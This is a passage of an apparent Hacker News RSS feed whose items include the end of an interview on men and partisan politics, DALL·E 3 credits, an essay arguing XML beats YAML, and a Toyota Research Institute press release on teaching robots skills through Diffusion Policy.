                </span></p><p>I think they’re effective because, first, they identify some real problems. Hawley’s a great example of this. If you read some passages of Hawley’s book or [listen to him speak], I’m like, yeah, that’s the same data that I’ve got. Yes, I’m with you so far, senator.</p>
<p>But then what he does is he says, these men are struggling, and you know why? And he doesn’t say because of what’s happened to the economy, or because of what’s happening elsewhere. He says, “Because of the Left. Because the Left is obsessed with toxic masculinity, and birthing people, and so on. The Left hates masculinity. The Left hates men. The Left would rather have a world where we got rid of men.”</p>
<p>It’s a straw woman that he creates. He says, “It’s feminism’s fault,” and “If you’re feeling pissed off, if you’re struggling as a man, I hear you, it’s their fault, vote for me. Do I have any policy prescriptions? No, because I’m a culture warrior and so I don’t need to actually be able to do anything about it.” But what he and what others do is successfully wrap together these real anxieties that a lot of men fee or that women feel on behalf of the men in their lives.</p>
<p>He says that’s also about the Second Amendment, and that’s also about Americanism; that’s also about religion. It gets wrapped up into this sense of being a real Christian American white man. Masculinity, Hawley says, is the tip of the spear of the Left’s attack against America.</p>

<p>I don’t think that’s even plausibly true. But I know why he’s doing that — because it’s visceral. You can attach a bunch of other things to that visceral sense of your identity as a man being under attack.</p>
<p>That doesn’t only work with Christian white men, although I’ve just mentioned them. I was very struck by a poll that found that half of American men now agree that “today, men are sometimes criticized just for acting like men” — that’s the quote in the survey — and black men are more likely to say that’s true.</p>
<p>A more positive response would be to say, we get it, here are a bunch of problems. For example, would it be a terrible idea to have an office of men’s health focused on issues around suicide and male mental health? Would it be a good idea if the [Centers for Disease Control and Prevention] recognized the suicide gap facing men and had some work around that?</p>
<p>Would it be a terrible idea to have a recruitment drive for male teachers? We have a massive recruitment drive for women into STEM and, most recently, women into construction. I’m here for that. But what about the fact that we have emptied out, not only education, but social work and psychology of men?</p>
<p>You have an infrastructure bill that will create jobs largely for men. Two-thirds of the jobs in the infrastructure bill will go to men: black men as much as white men, and Hispanic men a little bit more, because they’re so represented in the construction industry. Don’t hide from that fact, as the administration does when they’re challenged on it.</p>
<p>Own it. Make it a feature, not a bug. And say, “Here are all the things we’re doing on behalf of women.” There’s lots more to do for women. But the fact that this bill is the first piece of legislation for a long time that will specifically help working-class men of all races and ethnicities — I’m proud of that as a Democrat, because working-class men have had it pretty rough for the last few years.</p>
<p>Why not say that? Simple things like that, I believe, would take the wind out of the sails of the attack from the Right. The silence on these issues from the Left creates this huge political opening for the Right. And they’re seizing it.</p>

              </div>
          
        </section>
      
    
  

              </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[DALL·E 3 (653 pts)]]></title>
            <link>https://openai.com/dall-e-3</link>
            <guid>37586900</guid>
            <pubDate>Wed, 20 Sep 2023 17:18:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openai.com/dall-e-3">https://openai.com/dall-e-3</a>, See on <a href="https://news.ycombinator.com/item?id=37586900">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><strong>Core Research and Execution</strong><br>Gabriel Goh, James Betker, Li Jing, Aditya Ramesh</p><p><strong>Research Contributors—Primary</strong><br>Tim Brooks, Jianfeng Wang, Lindsey Li, Long Ouyang, Juntang Zhuang, Joyce Lee, Prafulla Dhariwal, Casey Chu, Joy Jiao</p><p><strong>Research Contributors—Secondary</strong><br>Jong Wook Kim, Alex Nichol, Yang Song, Lijuan Wang, Tao Xu</p><p><strong>Inference Optimization</strong><br>Connor Holmes, Arash Bakhtiari, Umesh Chand Koppaka, Zhewei Yao, Samyam Rajbhandari, Yuxiong He<br></p><p><strong>Product—Primary</strong><br>Yufei Guo, Luke Miller, Joyce Lee, Wesam Manassra, Anton Tananaev, Chester Cho, Rachel Lim</p><p><strong>Product—Secondary</strong><br>Dave Cummings, Rajeev Nayak, Sriya Santhanam<br></p><p><strong>Safety—Primary</strong><br>Sandhini Agarwal, Michael Lampe, Katarina Slama, Kim Malfacini, Bilva Chandra, Ashyana-Jasmine Kachra, Rosie Campbell, Florencia Leoni Aleman, Madelaine Boyd, Shengli Hu, Johannes Heidecke</p><p><strong>Safety—Secondary</strong><br>Lama Ahmad, Chelsea Carlson, Henry Head, Andrea Vallone, CJ Weinmann, Lilian Weng</p><p><strong>﻿Communications</strong><br>Alex Baker-Whitcomb, Ryan Biddy, Ruby Chen, Thomas Degry, Niko Felix, Elie Georges, Lindsey Held, Chad Nelson, Kendra Rimbach, Natalie Summers, Justin Wang, Hannah Wong, Kayla Wood<br></p><p><strong>Legal and Public Policy</strong><br>Che Chang, Jason Kwon, Fred von Lohmann, Ashley Pantuliano, David Robinson, Tom Rubin, Thomas Stasi<br></p><p><strong>Special Thanks</strong><br>Alec Radford, Mark Chen, Katie Mayer, Mikhail Bilenko, Mikhail Parakhin, Bob McGrew, Mira Murati, Greg Brockman, Sam Altman</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Mana Pool – Market for Magic Cards (115 pts)]]></title>
            <link>https://manapool.com/</link>
            <guid>37586681</guid>
            <pubDate>Wed, 20 Sep 2023 17:01:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://manapool.com/">https://manapool.com/</a>, See on <a href="https://news.ycombinator.com/item?id=37586681">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><svg xmlns="http://www.w3.org/2000/svg" id="Layer_2" viewBox="0 0 355.175 101.14" alt="Mana Pool - Buy and sell Magic: The Gathering cards"><defs><linearGradient id="linear-gradient" x1="17.61" x2="59.592" y1="49.09" y2="49.09" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#bfefff"></stop><stop offset=".356" stop-color="#bfe7ff"></stop><stop offset="1" stop-color="#bfdfff"></stop></linearGradient><linearGradient id="linear-gradient-2" x1="24.715" x2="66.697" y1="52.72" y2="52.72" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#80dfff"></stop><stop offset=".603" stop-color="#80c8ff"></stop><stop offset="1" stop-color="#80c0ff"></stop></linearGradient><linearGradient id="linear-gradient-3" x1="31.82" x2="73.802" y1="56.35" y2="56.35" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#40cfff"></stop><stop offset=".235" stop-color="#40c0ff"></stop><stop offset=".707" stop-color="#40a8ff"></stop><stop offset="1" stop-color="#40a0ff"></stop></linearGradient><linearGradient id="linear-gradient-4" x1="38.925" x2="80.907" y1="59.98" y2="59.98" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00bfff"></stop><stop offset=".382" stop-color="#00a0ff"></stop><stop offset=".764" stop-color="#08f"></stop><stop offset="1" stop-color="#0080ff"></stop></linearGradient><linearGradient id="linear-gradient-5" x1="5.639" x2="34.756" y1="49.694" y2="94.248" gradientUnits="userSpaceOnUse"><stop offset=".078" stop-color="#3b384d"></stop><stop offset=".595" stop-color="#28273b"></stop><stop offset="1" stop-color="#202033"></stop></linearGradient><linearGradient id="linear-gradient-6" x1="5.639" x2="34.756" y1="49.694" y2="94.248" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#595580"></stop><stop offset=".329" stop-color="#3d3b59"></stop><stop offset="1"></stop></linearGradient><linearGradient id="linear-gradient-7" x1="38.182" x2="84.3" y1="60.744" y2="85.171" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4e4c66"></stop><stop offset=".106" stop-color="#484660"></stop><stop offset=".658" stop-color="#303048"></stop><stop offset="1" stop-color="#282840"></stop></linearGradient><linearGradient id="linear-gradient-8" x1="54.688" x2="68.233" y1="58.391" y2="91.16" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#171621"></stop><stop offset="1"></stop></linearGradient><linearGradient id="linear-gradient-9" x1="5.202" x2="45.229" y1="20.229" y2="71.795" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#595473"></stop><stop offset=".026" stop-color="#565170"></stop><stop offset=".45" stop-color="#353349"></stop><stop offset=".79" stop-color="#212031"></stop><stop offset="1" stop-color="#1a1a29"></stop></linearGradient><linearGradient id="linear-gradient-10" x1="22.215" x2="135.804" y1="13.498" y2="46.312" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#5e5b7a"></stop><stop offset=".059" stop-color="#555370"></stop><stop offset=".329" stop-color="#353449"></stop><stop offset=".544" stop-color="#212131"></stop><stop offset=".677" stop-color="#1a1a29"></stop></linearGradient><linearGradient id="linear-gradient-11" x1="48.907" x2="112.126" y1="21.209" y2="39.472" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#565370"></stop><stop offset=".293" stop-color="#353449"></stop><stop offset=".53" stop-color="#212131"></stop><stop offset=".677" stop-color="#1a1a29"></stop></linearGradient><linearGradient id="linear-gradient-12" x1="37.387" x2="79.792" y1="31.839" y2="47.277" gradientUnits="userSpaceOnUse"><stop offset=".093" stop-color="#4e4c66"></stop><stop offset=".101" stop-color="#4d4b65"></stop><stop offset=".656" stop-color="#35354f"></stop><stop offset="1" stop-color="#2d2d47"></stop></linearGradient><linearGradient id="linear-gradient-13" x1="35.947" x2="45.374" y1="58.074" y2="57.805" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#232233"></stop><stop offset="1" stop-color="#242436"></stop></linearGradient><linearGradient id="linear-gradient-14" x1="79.378" x2="82.044" y1="25.305" y2="48.525" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#171621"></stop><stop offset="1" stop-color="#13131c"></stop></linearGradient><linearGradient id="linear-gradient-15" x1="55.582" x2="68.615" y1="59.069" y2="67.021" gradientUnits="userSpaceOnUse"><stop offset=".089" stop-color="#444259"></stop><stop offset=".61" stop-color="#303047"></stop><stop offset="1" stop-color="#282840"></stop></linearGradient><linearGradient id="linear-gradient-16" x1="-1.636" x2="14.348" y1="23.698" y2="44.289" gradientUnits="userSpaceOnUse"><stop offset=".018" stop-color="#8a84b3"></stop><stop offset=".285" stop-color="#69658c"></stop><stop offset=".596" stop-color="#474665"></stop><stop offset=".846" stop-color="#33334d"></stop><stop offset="1" stop-color="#2c2c45"></stop></linearGradient><linearGradient id="linear-gradient-17" x1="6.2" x2="46.53" y1="8.973" y2="20.515" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#8a84b3"></stop><stop offset=".29" stop-color="#76729f"></stop><stop offset=".728" stop-color="#5e5d88"></stop><stop offset="1" stop-color="#565680"></stop></linearGradient></defs><path d="M113.726 70.292V34.775c0-.476.265-.795.742-.795h5.354c.423 0 .742.16.901.53l12.191 29.845L145.16 34.51c.159-.371.424-.53.848-.53h5.354c.477 0 .796.318.796.794v35.517c0 .477-.319.795-.796.795h-4.4c-.477 0-.742-.318-.742-.795v-25.55l-10.337 25.71c-.159.423-.476.635-.901.635H130.9c-.424 0-.795-.212-.954-.636l-10.285-25.71v25.551c0 .477-.318.795-.794.795h-4.4c-.477 0-.742-.318-.742-.795ZM157.078 58.1c0-7.687 5.09-13.623 12.51-13.623 4.294 0 7.368 1.908 9.171 4.93l.106-3.5c0-.476.265-.795.742-.795h3.87c.476 0 .742.319.742.795v24.385c0 .477-.266.795-.742.795h-3.87c-.477 0-.742-.318-.742-.795l-.106-3.445c-1.855 3.021-4.93 4.876-9.17 4.876-7.422 0-12.51-5.884-12.51-13.623Zm13.624 8.376c4.612 0 7.845-3.34 7.845-8.324 0-5.035-3.233-8.427-7.845-8.427-4.666 0-8.058 3.392-8.058 8.375 0 5.036 3.392 8.376 8.058 8.376ZM189.414 70.292V45.907c0-.476.265-.795.743-.795h4.028c.477 0 .742.212.742.849l.212 3.18c1.484-2.65 4.082-4.664 8.164-4.664 5.513 0 9.436 3.816 9.436 10.654v15.161c0 .477-.319.795-.796.795h-4.188c-.476 0-.742-.318-.742-.795v-14.1c0-4.083-2.014-6.415-5.672-6.415-3.657 0-6.202 2.332-6.202 6.414v14.101c0 .477-.265.795-.742.795h-4.24c-.478 0-.743-.318-.743-.795ZM216.471 58.1c0-7.687 5.089-13.623 12.51-13.623 4.294 0 7.368 1.908 9.17 4.93l.106-3.5c0-.476.266-.795.742-.795h3.87c.477 0 .743.319.743.795v24.385c0 .477-.266.795-.742.795H239c-.477 0-.743-.318-.743-.795l-.105-3.445c-1.856 3.021-4.93 4.876-9.171 4.876-7.421 0-12.51-5.884-12.51-13.623Zm13.623 8.376c4.612 0 7.846-3.34 7.846-8.324 0-5.035-3.234-8.427-7.846-8.427-4.665 0-8.058 3.392-8.058 8.375 0 5.036 3.393 8.376 8.058 8.376ZM259.038 70.292V34.775c0-.476.265-.795.743-.795h10.707c8.428 0 12.67 4.877 12.67 11.822s-4.242 11.821-12.67 11.821h-5.513v12.669c0 .477-.318.795-.795.795h-4.4c-.477 0-.742-.318-.742-.795Zm11.185-17.97c3.923 0 7.209-1.538 7.209-6.52 0-4.984-3.286-6.52-7.209-6.52h-5.248v13.04h5.248ZM284.87 58.1c0-7.687 5.725-13.623 13.464-13.623 7.687 0 13.411 5.936 13.411 13.623s-5.724 13.623-13.41 13.623c-7.74 0-13.465-5.937-13.465-13.623Zm13.464 8.322c4.453 0 7.899-3.339 7.899-8.322 0-4.983-3.446-8.323-7.899-8.323-4.506 0-7.95 3.34-7.95 8.323 0 4.983 3.444 8.322 7.95 8.322ZM314.211 58.1c0-7.687 5.725-13.623 13.464-13.623 7.687 0 13.411 5.936 13.411 13.623s-5.724 13.623-13.41 13.623c-7.74 0-13.465-5.937-13.465-13.623Zm13.464 8.322c4.453 0 7.899-3.339 7.899-8.322 0-4.983-3.446-8.323-7.899-8.323-4.506 0-7.951 3.34-7.951 8.323 0 4.983 3.445 8.322 7.951 8.322ZM344.942 70.292V33.98c0-.476.264-.794.742-.794h4.24c.478 0 .742.318.742.794v36.312c0 .477-.264.795-.742.795h-4.24c-.478 0-.742-.318-.742-.795Z"></path><path d="M53.247 30.073 3.744 43.62v39.321l49.503-13.494V30.073zM85.311 46.162l-32.064-16.09v25.03l32.064-8.94z"></path><path d="M52.487 70.172V9.259l-41.982 11.49v60.913l41.982-11.49z" style="fill:#fff;stroke:#000;stroke-linejoin:round;stroke-width:2px"></path><path d="m17.61 85.292 41.982-11.49V12.888L17.61 24.379v60.913z" style="fill:url(#linear-gradient)"></path><path d="m24.715 88.922 41.982-11.49V16.518l-41.982 11.49v60.913z" style="fill:url(#linear-gradient-2)"></path><path d="m31.82 92.551 41.982-11.49V20.148L31.82 31.638v60.913z" style="fill:url(#linear-gradient-3)"></path><path d="M80.907 84.69V23.779l-41.982 11.49v60.913l41.982-11.49z" style="fill:url(#linear-gradient-4)"></path><path d="M35.809 99.031 3.744 82.942v-39.32L35.81 59.71v39.321z" style="fill:url(#linear-gradient-5)"></path><path d="M35.809 99.031 3.744 82.942v-39.32L35.81 59.71v1L4.654 45.086l.26 37.145 30.895 15.692v1.108z" style="fill:url(#linear-gradient-6)"></path><path d="M45.064 57.177 35.81 59.71v39.321L85.31 85.483V46.162l-9.68 2.65v22.032l-20.336 5.69v8.033l-10.23 2.676V57.177z" style="fill:url(#linear-gradient-7)"></path><path d="M35.809 97.923v1.108L85.31 85.483V46.162l-.768.214.06 38.323L35.81 97.923z" style="fill:url(#linear-gradient-8)"></path><path d="M35.809 59.71 3.744 43.621v-25.32L35.81 34.388V59.71z" style="fill:url(#linear-gradient-9)"></path><path d="M85.311 20.84 51.985 5.134 3.745 18.3l32.064 16.09L85.31 20.84z" style="fill:url(#linear-gradient-10)"></path><path d="M85.311 20.84 51.985 5.134l.01.503 31.44 15.011-47.626 12.99v.751L85.31 20.84z" style="fill:url(#linear-gradient-11)"></path><path d="m75.63 48.811 9.681-2.65v-25.32L35.81 34.388V59.71l9.255-2.533V41.042l15.284 5.67L75.63 32.676v16.135z" style="fill:url(#linear-gradient-12)"></path><path d="M35.809 58.706v1.004l9.255-2.533v-.996l-9.255 2.525z" style="fill:url(#linear-gradient-13)"></path><path d="m75.63 48.811 9.681-2.65v-25.32l-.84.23.056 24.39-8.896 2.544v.806z" style="fill:url(#linear-gradient-14)"></path><path d="m67.293 63.742-13.466 3.686V60.47l13.466-3.686v6.957z" style="fill:url(#linear-gradient-15)"></path><path d="m4.647 44.074-.903-.453v-25.32l.843.422.06 25.351z" style="fill:url(#linear-gradient-16)"></path><path d="M5.293 18.442 51.995 5.637l-.01-.503L3.745 18.3l32.064 16.09v-.753L5.294 18.442z" style="fill:url(#linear-gradient-17)"></path></svg> <p><span data-svelte-h="svelte-1nn0rg7">The Market for Magic Cards</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[XML is better than YAML – Hear me out (270 pts)]]></title>
            <link>https://changelog.com/posts/xml-better-than-yaml</link>
            <guid>37586580</guid>
            <pubDate>Wed, 20 Sep 2023 16:52:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://changelog.com/posts/xml-better-than-yaml">https://changelog.com/posts/xml-better-than-yaml</a>, See on <a href="https://news.ycombinator.com/item?id=37586580">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><em>This is a fancified excerpt of <a href="https://carlmjohnson.net/">Carl M. Johnson’s</a> unpopular opinion on the <a href="https://changelog.com/gotime/289">Go Time</a> podcast. <a data-play="/gotime/289/play" data-t="48:06" href="https://cdn.changelog.com/uploads/gotime/289/go-time-289.mp3" role="button" title="Play Go Time #289 starting at 48:06">Click here to listen</a> along while you read or <a href="https://youtu.be/jc2jzDzW0g4">watch the video</a> on YouTube. <a href="#unpop">Jump to the end</a> for the poll results. 📊</em></p>
<hr>
<p>My spicy take is that XML is better than YAML, because there are situations where XML is appropriate, but there’s no situation where YAML is appropriate.</p>
<p><strong>Johnny Boursiquot:</strong> <em>Dang. Shots fired! 🤣</em></p>
<h2>Let’s talk about XML first</h2>
<p>So, XML got a really bad reputation. The reason it got a really bad reputation is because people were using it for things that it should never have been used for. XML stands for <a href="https://www.w3.org/TR/xml/">Extensible Markup Language</a>. And if you’re using it as an <em>extensible markup language</em>, it’s actually really great.</p>
<p>Let’s say you’re working on something and you’re like:</p>
<blockquote>
<p>“I’m making a new kind of book, and I need to annotate all of the verses in the Bible, and have the chapter headings and stuff.”</p>
</blockquote>
<p>It’s great for that.</p>
<p>It’s really good for when you have a document, and some things are italicized, and some things are in a foreign language, and subtitles, and all that stuff. It’s really good for that. It’s not good if it’s like:</p>
<blockquote>
<p>“I need to configure this server and the server needs to know if this value is true or false.”</p>
</blockquote>
<p>No, that’s bad. Don’t do that. That’s not a good use for XML.</p>
<p>But XML does have some uses for which it’s appropriate. And I think the fact that now everybody is writing React… and they’re writing it with JSX… and JSX is basically just inline XML… I think that shows that there are cases where actually XML is pretty good.</p>
<h2>YAML on the other hand</h2>
<p>YAML on the other hand I think is never good. There’s always something better than YAML!</p>
<p>We’ve finally made it to Go 1.21 and I’m very happy about this. And you know why? Because YAML repeatedly <em>bit me in the behind</em> on Go 1.20. Ask me why.</p>
<p><strong>Johnny Boursiquot:</strong> <em>Why?</em></p>
<p>Well, when you say in your test file:</p>
<blockquote>
<p>“test this against Go 1.20”</p>
</blockquote>
<p>It interprets that as Go 1.2. 😭🤣</p>
<p>So it was like two or three different times I had a repo where I’m like:</p>
<blockquote>
<p>“These tests aren’t passing. Why are my tests not passing?! I’ve just upgraded to Go 1.20.”</p>
</blockquote>
<p>And it was like:</p>
<blockquote>
<p>“Oh, no. I’ve decided that this is Go 1.2”</p>
</blockquote>
<p>And so YAML is always going to do that to you…</p>
<h3>Better choices</h3>
<p>Now, I understand why people do YAML, but there are better choices. You can use <a href="https://toml.io/en/">TOML</a>. You can use <a href="https://cuelang.org/">CUE</a>. You can use lots of things.</p>
<p>I like how <a href="https://caddyserver.com/">Caddy</a> does it. With Caddy, the canonical language that Caddy understands is JSON, but they have adapters.</p>
<p>So if you want to write YAML, you can. But it’ll just take that YAML and turn it into JSON behind the scenes.  Then they also have a specific Caddy language. So you can give it the Caddy language and then it turns that into JSON behind the scenes. And you can give it an NGINX config and it’ll turn that into JSON behind the scenes. If you have the cycles and time to spare, that’s probably the best solution for most people…</p>
<p>But when the only way to do it is YAML, it’s like:</p>
<blockquote>
<p>“No…!”</p>
</blockquote>
<p>It’s just too error-prone, there’s too many things… You just have to always quote everything.</p>
<h3>Also…</h3>
<p>Also the YAML specification has all these features that nobody ever uses, because they’re really confusing, and hard, and you can include documents inside of other documents, with references and stuff… And it’s like</p>
<blockquote>
<p>“Oh, man, I don’t want to have to understand any of this stuff.”</p>
</blockquote>
<p>And then if you’re not careful, it’d be like:</p>
<blockquote>
<p>“Oh yeah, the first three things I fed it to understood that, but then the third one was just like using some parser that they found on the back of a truck, and it doesn’t understand it”</p>
</blockquote>
<p>and it’s like:</p>
<blockquote>
<p>“Oh, man…”</p>
</blockquote>
<p>YAML… never appropriate. XML is sometimes appropriate.</p>
<hr>
<h3 id="unpop">The polls are open 🗳️</h3>
<p><em>There you have it. Carl’s reasoning for why XML is better than YAML. Do you agree or disagree? Let your opinion be heard by voting on <a href="https://changelog.social/@gotime/111098085461260473">Mastodon</a> and <a href="https://twitter.com/GoTimeFM/status/1704511116296978592">X</a>!</em></p>
<p><em>Or just duke it out in the comments below … we’re listening! 👇</em></p>

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Toyota Research claims breakthrough in teaching robots new behaviors (361 pts)]]></title>
            <link>https://www.tri.global/news/toyota-research-institute-unveils-breakthrough-teaching-robots-new-behaviors</link>
            <guid>37586264</guid>
            <pubDate>Wed, 20 Sep 2023 16:30:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tri.global/news/toyota-research-institute-unveils-breakthrough-teaching-robots-new-behaviors">https://www.tri.global/news/toyota-research-institute-unveils-breakthrough-teaching-robots-new-behaviors</a>, See on <a href="https://news.ycombinator.com/item?id=37586264">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main-wrapper">
              <main id="content" role="main">
                <section>
                  <a id="main-content" tabindex="-1"></a>
                    <div id="block-tri-global-content">
      

<article data-history-node-id="466" role="article" about="/news/toyota-research-institute-unveils-breakthrough-teaching-robots-new-behaviors">
  
  <div>
      <div>
          
          <p><span>Toyota Research Institute Unveils Breakthrough in Teaching Robots New Behaviors</span>

          
          
        </p></div>
      <div><p><em>New Generative AI Technique Brings Researchers One Step Closer to Building a “Large Behavior Model”</em></p>

<p><strong>LOS ALTOS, Calif. and CAMBRIDGE, Mass. (Sept. 19, 2023)<span>&nbsp;</span></strong>– Today, Toyota Research Institute (TRI) announced a breakthrough generative AI approach based on Diffusion Policy to quickly and confidently teach robots new, dexterous skills. This advancement significantly improves robot utility and is a step towards building “Large Behavior Models (LBMs)” for robots, analogous to the Large Language Models (LLMs) that have recently revolutionized conversational AI.</p>

<p>“Our research in robotics is aimed at amplifying people rather than replacing them,” said<span>&nbsp;</span><a href="https://www.tri.global/about-us/dr-gill-pratt" rel="noopener" target="_blank">Gill Pratt</a>, CEO of TRI and Chief Scientist for Toyota Motor Corporation. “This new teaching technique is both very efficient and produces very high performing behaviors, enabling robots to much more effectively amplify people in many ways.”</p>

<p>Previous state-of-the-art techniques to teach robots new behaviors were slow, inconsistent, inefficient, and often limited to narrowly defined tasks performed in highly constrained environments. Roboticists needed to spend many hours writing sophisticated code and/or using numerous trial and error cycles to program behaviors.</p>

<p>TRI has already taught robots more than 60 difficult, dexterous skills using the new approach, including pouring liquids, using tools, and manipulating deformable objects. These achievements were realized without writing a single line of new code; the only change was supplying the robot with new data. Building on this success, TRI has set an ambitious target of teaching hundreds of new skills by the end of the year and 1,000 by the end of 2024.</p>

<p>Today’s news also highlights that robots can be taught to function in new scenarios and perform a wide range of behaviors. These skills are not limited to just “‘pick and place” or simply picking up objects and putting them down in new locations. TRI’s robots can now interact with the world in varied and rich ways — which will one day allow robots to support people in everyday situations and unpredictable, ever-changing environments.</p>



<p><iframe width="854" height="480" frameborder="0" allowfullscreen="allowfullscreen" src="https://www.youtube.com/embed/w-CGSQAO5-Q?autoplay=0&amp;start=0&amp;rel=0"></iframe>
</p>




<p>“The tasks that I’m watching these robots perform are simply amazing – even one year ago, I would not have predicted that we were close to this level of diverse dexterity,” remarked<span>&nbsp;</span><a href="https://www.tri.global/about-us/dr-russ-tedrake" rel="noopener" target="_blank">Russ Tedrake</a>, Vice President of Robotics Research at TRI. Dr. Tedrake, who is also the Toyota Professor of Electrical Engineering and Computer Science, Aeronautics and Astronautics, and Mechanical Engineering at MIT, explained, “What is so exciting about this new approach is the rate and reliability with which we can add new skills. Because these skills work directly from camera images and tactile sensing, using only learned representations, they are able to perform well even on tasks that involve deformable objects, cloth, and liquids — all of which have traditionally been extremely difficult for robots.”</p>

<p><strong>Technical details:</strong></p>

<p>TRI’s robot behavior model learns from haptic demonstrations from a teacher, combined with a language description of the goal. It then uses an AI-based Diffusion Policy to learn the demonstrated skill. This process allows a new behavior to be deployed autonomously from dozens of demonstrations. Not only does this approach produce consistent, repeatable, and performant results, but it does so with tremendous speed.</p>

<p>Key achievements of TRI’s research for this novel development include:</p>

<ul><li><strong>Diffusion Policy:</strong><span>&nbsp;</span>TRI and our collaborators in<span>&nbsp;</span><a href="https://shurans.github.io/" rel="noopener" target="_blank">Professor Song</a>’s group at Columbia University developed a new, powerful generative-AI approach to behavior learning. This approach, called<span>&nbsp;</span><a href="https://arxiv.org/abs/2303.04137" rel="noopener" target="_blank">Diffusion Policy</a>, enables easy and rapid behavior teaching from demonstration.</li>
	<li><strong>Customized Robot Platform:<span>&nbsp;</span></strong>TRI’s robot platform is custom-built for dexterous dual-arm manipulation tasks with a special focus on enabling haptic feedback and tactile sensing.</li>
	<li><strong>Pipeline</strong>: TRI robots have learned 60 dexterous skills already, with a target of hundreds by the end of the year and 1,000 by the end of 2024.</li>
	<li><strong>Drake:</strong><span>&nbsp;</span>Part of our (not so) secret sauce is<span>&nbsp;</span><a href="https://drake.mit.edu/" rel="noopener" target="_blank">Drake</a>, a model-based design for robotics that provides us with a cutting-edge toolbox and simulation platform. Drake’s high degree of realism allows us to develop in both simulation and in reality at a dramatically increased scale and velocity than would otherwise be possible. Our internal robot stack is built using Drake’s optimization and systems frameworks, and we have made Drake open source to catalyze work across the entire robotics community.</li>
	<li><strong>Safety:<span>&nbsp;</span></strong>Safety is core to our robotics efforts at TRI. We have designed our system with strong safeguards, powered by Drake and our custom robot control stack, to ensure our robots respect safety guarantees like not colliding with itself or its environment.</li>
</ul><p><a href="https://arxiv.org/abs/2303.04137" rel="noopener" target="_blank"><em>Diffusion Policy</em></a><em><span>&nbsp;</span>has been published at the 2023 Robotics Science and Systems conference. Additional technical information can be found on<span>&nbsp;</span></em><a href="https://toyotaresearch.medium.com/2c30b1a8c573" rel="noopener" target="_blank"><em>TRI’s Medium blog</em></a><em>.&nbsp;</em></p>

<p><em>Please join our LinkedIn Live Q&amp;A session on October 4th from 1 pm – 1:30 pm ET / 10 am – 10:30 am PT, for an opportunity to learn more and hear directly from the TRI robotics research team. Sign up for the event on<span>&nbsp;</span></em><a href="https://www.linkedin.com/events/trilinkedinlive7108154211422408704/theater/" rel="noopener" target="_blank"><em>TRI’s LinkedIn page</em></a><em>.</em></p>



<p><strong>About Toyota Research Institute</strong></p>

<p>Toyota Research Institute (TRI) conducts research to amplify human ability, focusing on making our lives safer and more sustainable. Led by Dr. Gill Pratt, TRI’s team of researchers develops technologies to advance energy and materials, human-centered artificial intelligence, human interactive driving, machine learning, and robotics. Established in 2015, TRI has offices in Los Altos, California, and Cambridge, Massachusetts. For more information about TRI, please visit<span>&nbsp;</span><a href="http://tri.global/" rel="noopener" target="_blank">http://tri.global</a>.</p>



<p><strong>TRI Media Contact</strong></p>

<p>Wendy Rosen<br>
Senior Director of Communications<br><a href="mailto:wendy.rosen@tri.global" rel="noopener" target="_blank">wendy.rosen@tri.global</a></p>

</div>
    </div>
</article>

    </div>


                </section>
              </main>
                                  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Booklet – Async forums as an alternative to chat (173 pts)]]></title>
            <link>https://www.booklet.group/</link>
            <guid>37585869</guid>
            <pubDate>Wed, 20 Sep 2023 16:02:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.booklet.group/">https://www.booklet.group/</a>, See on <a href="https://news.ycombinator.com/item?id=37585869">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><a href="https://hq.booklet.group/posts/new-on-booklet-use-a-custom-domain-with-your-commu" target="_blank"></a><h2 data-w-id="ed1920cb-257b-ff0e-0154-43249ee85486">Because important discussions get lost in chat.</h2><p data-w-id="ed1920cb-257b-ff0e-0154-43249ee8548a">Booklet is a modern discussion forum and member directory for professional groups. It sends calm, automated summaries to everybody so that they stay informed and engaged.<br></p><p><a data-w-id="ed1920cb-257b-ff0e-0154-43249ee8548c" href="https://new.booklet.group/">Get started →</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Cancer expert gets experimental treatment for incurable tumour,phenomenal result (165 pts)]]></title>
            <link>https://www.abc.net.au/news/2023-09-20/melanoma-richard-scolyer-georgina-long-early-results/102879818</link>
            <guid>37584578</guid>
            <pubDate>Wed, 20 Sep 2023 14:27:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.abc.net.au/news/2023-09-20/melanoma-richard-scolyer-georgina-long-early-results/102879818">https://www.abc.net.au/news/2023-09-20/melanoma-richard-scolyer-georgina-long-early-results/102879818</a>, See on <a href="https://news.ycombinator.com/item?id=37584578">Hacker News</a></p>
